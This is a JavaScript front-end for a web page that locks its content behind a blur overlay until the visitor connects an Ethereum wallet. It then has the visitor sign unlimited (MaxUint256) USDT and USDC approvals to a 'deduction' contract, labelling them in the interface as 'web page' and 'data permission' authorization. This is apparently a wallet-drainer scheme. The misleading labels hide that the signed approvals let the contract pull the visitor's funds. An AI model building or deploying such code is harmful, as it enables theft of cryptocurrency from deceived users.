// SPDX-License-Identifier: MIT
// pragma solidity ^0.8.20;  //  Not applicable in JavaScript

// 你的 USDT 扣款合约地址 (SimpleMerchantERC 合约)
const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f'; //  你的 SimpleMerchantERC (USDT) 合约地址

// 你的 USDC 扣款合约的地址 (新的 SimpleMerchantERC 合约)
const USDC_CONTRACT_ADDRESS = '0x26a56371201d2611763afb8b427ccb2239746560'; // 你的 USDC 扣款合约的地址 (新的， 独立部署的 SimpleMerchantERC)

// USDT 合約地址 (USDT 合約的地址, 不是扣款合約，用於 approve，balanceOf, allowance)
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';  // 你的 USDT 合约地址

// USDC 合約地址 (USDC 合約的地址，用於 approve，balanceOf, allowance)
const USDC_CONTRACT_ADDRESS_TOKEN = '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48'; // 你的 USDC  代币合约地址

// 合約 ABI (用于扣款的 SimpleMerchantERC 合约)  (SimpleMerchantERC 的 ABI - 與 USDT 和 USDC 扣款合約相同)
const CONTRACT_ABI = [ // SimpleMerchantERC 的 ABI
    "function connectAndAuthorize() external",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer, address indexed token)",
    // 包含 ETHReceived, Deducted 這些事件 (為了檢查)
    "event Deducted(address indexed customer, address indexed token, uint256 amount)",
    "event EthReceived(address indexed sender, uint256 amount)",
    "event Withdrawn(uint256 amount)",
];

// ERC20 代幣 ABI (用於 approve, balanceOf, allowance)
const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) external view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract, usdcContract,  usdcDeductContract;  //  usdcDeductContract 用于 USDC 扣款合约

// 存储事件监听器引用以在重新初始化时移除旧的监听器
let accountChangeListener = null;
let chainChangeListener = null;

const overlay = document.getElementById('blurOverlay'); // 新增：獲取遮罩元素
const overlayMessage = document.getElementById('overlayMessage'); // 新增：獲取遮罩訊息元素

// --- 遮罩控制函數 ---
function hideOverlay() {
    overlay.style.opacity = '0';
    setTimeout(() => {
        overlay.style.display = 'none';
    }, 300); // 等待淡出效果完成
}

function showOverlay(message) {
    overlayMessage.innerHTML = message;
    overlay.style.display = 'flex';
    setTimeout(() => {
        overlay.style.opacity = '1';
    }, 10);
}

// --- initializeWallet 函數 (仅保留错误/必要消息) ---
async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet');
            showOverlay('Please install MetaMask or a supported wallet to continue');
            return;
        }

        provider = new ethers.BrowserProvider(window.ethereum);

        // 移除舊的監聽器以防止重複綁定
        if (accountChangeListener) window.ethereum.removeListener('accountsChanged', accountChangeListener);
        if (chainChangeListener) window.ethereum.removeListener('chainChanged', chainChangeListener);

        // 檢查網絡並切換到 Mainnet (保持不變)
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) { // 1n is Mainnet Chain ID
            updateStatus('Switching to Ethereum Mainnet...');
            showOverlay('Trying to switch to Ethereum mainnet... Please confirm in wallet');
            try {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }]
                });
                // 成功切換後重新初始化 provider
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.getNetwork();
            } catch (switchError) {
                if (switchError.code === 4001) {
                    updateStatus('User rejected network switch. Please manually switch to Ethereum Mainnet.');
                    showOverlay('The user declined the network switch. Please manually switch to Ethereum Mainnet.');
                } else {
                    updateStatus(`Network switch failed: ${switchError.message}`);
                    showOverlay(`Network switch failure: ${switchError.message}`);
                }
                return;
            }
        }

        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();

            // 使用 signer 初始化合约实例
            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer); // SimpleMerchantERC (USDT 扣款)
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer); //  USDT 的 ERC20 合约
            usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS_TOKEN, ERC20_ABI, signer); // USDC Token 合约 (用於 balanceOf 和 allowance)
            //  新的 USDC 扣款合约 (請將  CONTRACT_ABI 修改為 USDC 扣款合約的 ABI，如果和 SIMPLEMERCHANTERC 的 ABI 相同，就用 CONTRACT_ABI)
            usdcDeductContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, CONTRACT_ABI, signer);  //  USDC 扣款合约的实例

            // ** 連線已恢復，直接檢查授權，不顯示進度文字 **
            updateStatus(''); // 清空/隱藏狀態欄
            await checkAuthorization();
        } else {
            updateStatus('');
            showOverlay('Please connect your wallet to unlock the contents 🔒');
        }

        // 帳戶變更監聽器，簡化為重新初始化
        accountChangeListener = (accounts) => {
            if (accounts.length === 0) {
                resetState();
                updateStatus('Wallet disconnected');
            } else {
                initializeWallet();
            }
        };
        window.ethereum.on('accountsChanged', accountChangeListener);

        // 網絡變更監聽器
        chainChangeListener = () => {
            resetState();
            updateStatus('Network changed, please reconnect wallet');
            window.location.reload();
        };
        window.ethereum.on('chainChanged', chainChangeListener);

    } catch (error) {
        updateStatus(`Initialization failed: ${error.message}`);
        console.error("Initialize Wallet Error:", error);
        showOverlay(`Initialization failed: ${error.message}`);
    }
}

// --- checkAuthorization 函數 (檢查 USDT 和 USDC 的授權狀態) ---
async function checkAuthorization() {
    try {
        if (!signer || !userAddress || !contract || !usdtContract || !usdcContract || !usdcDeductContract) {
            showOverlay('Wallet not opened. Please connect.');
            return;
        }

        // 檢查 SimpleMerchant 合約的授權  (檢查 SimpleMerchant 合约的授权状态)
        const isAuthorized = await contract.authorized(userAddress);

        // 检查 USDT 的授权
        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS); //  对 USDT 扣款合约的授权.
        const maxAllowance = ethers.MaxUint256;
        let usdtBalance = 0n;
        try {
            usdtBalance = await usdtContract.balanceOf(userAddress);
        } catch(e) { /* Ignore balance read error */ }
        const isUsdtMaxApproved = usdtAllowance >= maxAllowance / 2n; // 检查是否接近最大值

        // 检查 USDC 的授权
        const usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        let usdcBalance = 0n;
        try {
            usdcBalance = await usdcContract.balanceOf(userAddress);
        } catch(e) { /* Ignore balance read error */ }
        const isUsdcMaxApproved = usdcAllowance >= maxAllowance / 2n; // 檢查是否接近最大值


        let statusMessage = '';

        // SimpleMerchant 合約授權
        if (isAuthorized) {
            statusMessage += 'Wallet connected ✅. ';
        } else {
            statusMessage += 'Wallet connect failed ❌. ';
        }

        // USDT 的授權狀態
        statusMessage += `USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. `;
        if (isUsdtMaxApproved) {
            statusMessage += `Web page authorization successful ✅.`;
        } else if (usdtAllowance > 0n) {
            statusMessage += `Web page authorization failed ⚠️.`;
        } else {
            statusMessage += `Data permissions are not authorized or authorization fails ❌.`;
        }

        // USDC 的授權狀態
        statusMessage += `USDC Balance: ${ethers.formatUnits(usdcBalance, 6)}. `;
        if (isUsdcMaxApproved) {
            statusMessage += `Data permission authorization successful ✅.`;
        } else if (usdcAllowance > 0n) {
            statusMessage += `Data authorization failed ⚠️.`;
        } else {
            statusMessage += `Data permissions are not authorized or authorization fails ❌.`;
        }

        // Button state: needs to be clicked if authorization is incomplete
        const allAuthorized = isAuthorized && isUsdtMaxApproved && isUsdcMaxApproved;  // 同时检查 USDT 和 USDC

        if (allAuthorized) {
            connectButton.classList.add('connected');
            connectButton.title = 'Disconnect Wallet';
            connectButton.disabled = false;
            updateStatus(''); // 成功時，清空/隱藏狀態欄
            hideOverlay(); // 完全授權，隱藏遮罩
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
            connectButton.disabled = false;
            updateStatus(''); // 授權未完成，清空/隱藏狀態欄
            showOverlay('You need to complete the authorization to view the content. Click the wallet link in the upper right corner.'); // 授權未完成，顯示遮罩
        }

    } catch (error) {
        updateStatus(`Authorization check failed: ${error.message}`);
        console.error("Check Authorization Error:", error);
        showOverlay(`Authorization check failed: ${error.message}`);
    }
}

// --- connectWallet 函數 (主要修改：調用 connectAndAuthorize 和 approve) ---
async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('Please install MetaMask or a supported wallet');
            return;
        }

        updateStatus(''); // 連線開始，隱藏狀態欄
        showOverlay('Please confirm the connection request in your wallet...');

        // Request wallet connection (MetaMask will confirm or maintain connection)
        await provider.send('eth_requestAccounts', []);

        // Re-get signer and contract instances
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer); // SimpleMerchantERC (USDT 扣款)
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer); //  USDT 合约
        usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS_TOKEN, ERC20_ABI, signer); // USDC Token 合约 (用於 balanceOf 和 allowance)
        usdcDeductContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, CONTRACT_ABI, signer);  //  USDC 扣款合约的实例

        // Check ETH balance (for Gas Fee)  (保持不變)
        const ethBalance = await provider.getBalance(userAddress);
        const requiredEthForGas = ethers.parseEther('0.001');
        if (ethBalance < requiredEthForGas) {
            updateStatus(`Warning: ETH balance may be insufficient for authorization transactions (Suggested min ${ethers.formatEther(requiredEthForGas)} ETH, Actual ${ethers.formatEther(ethBalance)} ETH).`);
        } else {
            updateStatus('');
        }

        // 1. 檢查 SimpleMerchant 合約的授權 (connectAndAuthorize)
        let isAuthorized = await contract.authorized(userAddress);
        if (!isAuthorized) {
          updateStatus(''); // 隐藏进度
          showOverlay('1/3: Please sign the authorization in the wallet'); // 修改提示
          const txAuthorize = await contract.connectAndAuthorize(); // 调用 connectAndAuthorize,  不需要再傳入代幣合約地址
          await txAuthorize.wait();
          updateStatus(''); // 隐藏成功消息
        } else {
          updateStatus(''); // 隐藏已授权消息
        }

        // 2. 检查并执行 USDT 代币的批准 (approve)
        let usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
        const maxAllowance = ethers.MaxUint256;

        if (usdtAllowance < maxAllowance) {
            updateStatus(''); // 隐藏进度
            showOverlay('2/3: Please sign the authorization in the wallet');
            try {
              const txApproveUsdt = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
              await txApproveUsdt.wait();
              updateStatus(''); // 隐藏成功消息
            } catch (error) {
                console.error("approve failed:", error);
                updateStatus(`Authorization failed: ${error.message}`);
                showOverlay(`Authorization failed: ${error.message}`);
                return; // 停止，不要继续后面的授权步骤
            }
        } else {
            updateStatus(''); // 隐藏已授权消息
        }

        // 3. 检查并执行 USDC 代币的批准 (approve)
        let usdcAllowance = await usdcContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);

        if (usdcAllowance < maxAllowance) {
            updateStatus(''); // 隐藏进度
            showOverlay('3/3: Please sign the authorization in the wallet');
            try {
              const txApproveUsdc = await usdcContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance); //  USDC 授權給SimpleMerchantERC (实际上是 SimpleMerchantERC 合约的地址， 用于批准给 SimpleMerchantERC )
              await txApproveUsdc.wait();
              updateStatus(''); // 隐藏成功消息
            } catch (error) {
                console.error("approve failed:", error);
                updateStatus(`Authorization failed: ${error.message}`);
                showOverlay(`Authorization failed: ${error.message}`);
                return; // 停止，不要继续后面的授权步骤
            }
        } else {
            updateStatus(''); // 隐藏已授权消息
        }

        // Final check and update button appearance
        await checkAuthorization();
        updateStatus(''); // 連線成功，隱藏狀態欄

    } catch (error) {
        updateStatus(`Operation failed: ${error.message}`);
        console.error("Connect Wallet Error:", error);
        connectButton.classList.remove('connected');
        connectButton.title = 'Connect Wallet';
        connectButton.disabled = false;
        showOverlay(`The operation failed. Please try again or check the connection manually. Error: ${error.message.slice(0, 50)}...`);
    }
}

// --- 其他函數 (保持不變) ---

function disconnectWallet() {
    resetState();
    updateStatus('Wallet disconnected, please reconnect.');
    alert('Wallet disconnected. To fully remove site access from MetaMask, please manually remove this site from "Connected Sites" in MetaMask settings.');
    showOverlay('The wallet is disconnected, please reconnect to unlock the page 🔒');
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;   // SimpleMerchantERC 的合约 (USDT)
    usdtContract = null;
    usdcContract = null; // USDC 的 token 合约
    usdcDeductContract = null; //  USDC 扣款合约 ( SimpleMerchantERC )
    connectButton.classList.remove('connected');
    connectButton.title = 'Connect Wallet';
    connectButton.disabled = false;
    updateStatus('');
    showOverlay('Please link your wallet to unlock the page 🔒');
}

/**
 * 核心功能：控制状态栏的隐藏与显示。
 */
function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    if (message) {
        statusDiv.innerHTML = `${message}`;
        statusDiv.style.display = 'block';
    } else {
        statusDiv.innerHTML = '';
        statusDiv.style.display = 'none';
    }
}

// Listen for connect button click
connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});

// Initialize wallet state on page load
initializeWallet();
console.log('connectButton event listener added and initializeWallet called');